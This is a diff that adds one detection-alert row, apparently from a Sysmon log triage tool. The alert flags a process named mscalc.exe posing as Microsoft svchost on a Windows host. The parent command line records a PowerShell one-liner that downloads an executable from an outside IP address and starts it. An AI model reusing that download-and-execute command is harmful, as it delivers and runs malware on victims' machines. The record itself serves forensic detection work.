@@ -1,0 +1,24 @@
+2023-09-20T03:03:24.808584+00:00,Potential Defense Evasion Via Raw Disk Access By Uncommon Tools,../Logs/Microsoft-Windows-Sysmon%4Operational.evtx,1,Microsoft-Windows-Sysmon,1,3844,DESKTOP-V0F35DT,"CommandLine: '""C:\Users\HoaGay\AppData\Local\Temp\mscalc.exe"" '
+Company: Microsoft
+CurrentDirectory: C:\Users\HoaGay\Documents\Subjects\
+Description: svchost
+FileVersion: 1.0.0.0
+Hashes: MD5=B94F3FF666D9781CB69088658CD53772
+Image: C:\Users\HoaGay\AppData\Local\Temp\mscalc.exe
+IntegrityLevel: Medium
+LogonGuid: 335CB4AA-604E-650A-8DB4-040000000000
+LogonId: '0x4b48d'
+OriginalFileName: svchost.exe
+ParentCommandLine: powershell.exe  (new-object system.net.webclient).downloadfile('http://103.162.14.116:8888/mscalc.exe','C:\Users\HoaGay\AppData\Local\Temp\mscalc.exe');start-process 'C:\Users\HoaGay\AppData\Local\Temp\mscalc.exe'
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentProcessGuid: 335CB4AA-60FB-650A-0001-000000000D00
+ParentProcessId: 3856
+ParentUser: DESKTOP-V0F35DT\HoaGay
+ProcessGuid: 335CB4AA-60FC-650A-0201-000000000D00
+ProcessId: 7528
+Product: svchost
+RuleName: '-'
+TerminalSessionId: 1
+User: DESKTOP-V0F35DT\HoaGay
+UtcTime: 2023-09-20 03:03:24.802
+"
